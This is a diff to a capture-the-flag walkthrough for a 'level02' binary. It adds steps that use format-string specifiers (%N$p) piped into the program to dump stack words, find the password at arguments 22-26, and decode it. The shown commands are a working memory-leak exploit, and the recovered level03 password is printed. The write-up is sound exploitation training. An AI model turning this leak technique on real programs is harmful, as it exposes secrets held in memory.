@@ -78,9 +78,52 @@ AAAA 0x... (nil) 0x... 0x2a2a2a2a2a2a2a2a ...
 The `0x2a2a...` words are the `*` banner; walking further along the argument list we reach
 the password buffer. Direct parameter access (`%N$p`) lets us jump straight to it.
 
-## 4. Locate and read the password
+## 4. Find which arguments hold the password
 
-🟦 **Goal:** find which argument indices hold the password and dump them in order.
+🟦 **Goal:** locate the exact stack positions of the password by dumping the stack and
+scanning for printable ASCII. First attempt, label every value with its index:
+
+🟨 **Terminal:**
+
+```bash
+(python -c 'print " ".join("%d:%%%d$p" % (i,i) for i in range(1,41))'; echo x; cat) | ./level02
+```
+
+⬜ **Output (cut short):**
+
+```text
+1:0x... 2:(nil) ... 8:0x70243431253a3431 ... 13:0x3a3931207024383  does not have access!
+```
+
+Two lessons here: the dump stops around index 13 because `username` is only a **100-byte
+buffer** (`fgets(username, 100, ...)`), so the long format string is truncated; and the
+words from index 8 on (`0x70243431...` decodes to `"14:%14$p"`) are **our own input** echoed
+back, so our buffer sits around argument 8.
+
+🟦 **Goal:** because the string must stay under 100 bytes, scan a **window** that fits. Dump
+positions 15-30 compactly (no labels), then count along the output:
+
+🟨 **Terminal:**
+
+```bash
+(python -c 'print " ".join("%%%d$p" % i for i in range(15,31))'; echo x; cat) | ./level02
+```
+
+⬜ **Output:**
+
+```text
+(nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) ...
+```
+
+The first value is argument 15, so counting along: arguments **22-26** are the five
+consecutive words whose bytes are all printable ASCII (`0x756e...` = `"Hh74RPnu"`). They are
+bounded by non-ASCII on both sides (arg 21 and arg 27 are `(nil)`), and 5 words x 8 bytes =
+40 = the password length, which confirms 22 is the start and 26 is the end.
+
+## 5. Read the password in order
+
+🟦 **Goal:** now that we know it's at 22-26, dump those directly, from 26 down to 22 so the
+words line up:
 
 🟨 **Terminal:**
 
@@ -93,9 +136,6 @@ the password buffer. Direct parameter access (`%N$p`) lets us jump straight to i
 ```text
 0x48336750664b394d0x354a35686e4758730x377a7143574e67580x45414a35617339510x756e505234376848 does not have access!
 ```
-
-Arguments **22-26** hold the password. We print them from 26 down to 22 so the words line up
-in the right order.
 
 🟦 **Goal:** decode the leaked words. Each 8-byte word is stored little-endian, so we convert
 hex → raw bytes and reverse.
@@ -114,7 +154,7 @@ Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
 
 That is `level03`'s password.
 
-## 5. Move to the next level
+## 6. Move to the next level
 
 🟨 **Terminal:**
 
